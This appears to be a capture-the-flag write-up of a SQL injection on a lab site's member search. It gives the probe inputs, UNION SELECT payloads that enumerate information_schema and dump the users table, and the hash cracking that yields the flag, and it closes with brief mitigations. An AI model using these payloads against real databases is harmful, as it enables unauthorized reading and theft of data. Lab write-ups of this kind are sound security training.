# SQL_Injection_members

## Description

A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

## Test_sql_injection

    # input:
    "'", "--", "1 or 1=1" ...
    
    # result:
    "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1"

## Get_data

    # input:
    "1 or 1=1"
    
    # result:
    ID: 1 or 1=1 
    First name: Barack Hussein
    Surname : Obama

    ID: 1 or 1=1 
    First name: Adolf
    Surname : Hitler

    ID: 1 or 1=1 
    First name: Joseph
    Surname : Staline

    ID: 1 or 1=1 
    First name: Flag
    Surname : GetThe

## Analyze_data_and_try_to_find_information
    # Info we want to know:
    ID: 1 or 1=1 
    First name: Flag
    Surname : GetThe

    # input: (1) to find current database
    1 or 1=1 union SELECT null, table_name FROM information_schema.tables WHERE table_schema=database();

    # result: (1)
    ID: 1 or 1=1 union SELECT null, table_name FROM information_schema.tables WHERE table_schema=database(); 
    First name: 
    Surname : users

    # input: (2) to find columns informations
    1 or 1=1 union SELECT table_name, column_name FROM information_schema.columns 

    # result: (2)
    ID: 1 or 1=1 union SELECT table_name, column_name FROM information_schema.columns 
    First name: users
    Surname : user_id

    ID: 1 or 1=1 union SELECT table_name, column_name FROM information_schema.columns 
    First name: users
    Surname : first_name

    ID: 1 or 1=1 union SELECT table_name, column_name FROM information_schema.columns 
    First name: users
    Surname : last_name

    ID: 1 or 1=1 union SELECT table_name, column_name FROM information_schema.columns 
    First name: users
    Surname : town

    ID: 1 or 1=1 union SELECT table_name, column_name FROM information_schema.columns 
    First name: users
    Surname : country

    ID: 1 or 1=1 union SELECT table_name, column_name FROM information_schema.columns 
    First name: users
    Surname : planet

    ID: 1 or 1=1 union SELECT table_name, column_name FROM information_schema.columns 
    First name: users
    Surname : Commentaire

    ID: 1 or 1=1 union SELECT table_name, column_name FROM information_schema.columns 
    First name: users
    Surname : countersign

## Final_analysis
    # input: 
    1 or 1=1 union select null, concat(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users

    # result:
    ID: 1 or 1=1 union select null, concat(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users 
    First name: 
    Surname : 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28

## Get_the_flag
    5ff9d0165b4f92b14994e5c685cdce28: MD5 Hash -> crack hash: FortyTwo
    fortytwo -> SHA256: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5


## Solutions

    - Use of Prepared Statements
    - Allow-list Input Validation
    - Escaping All User Supplied Input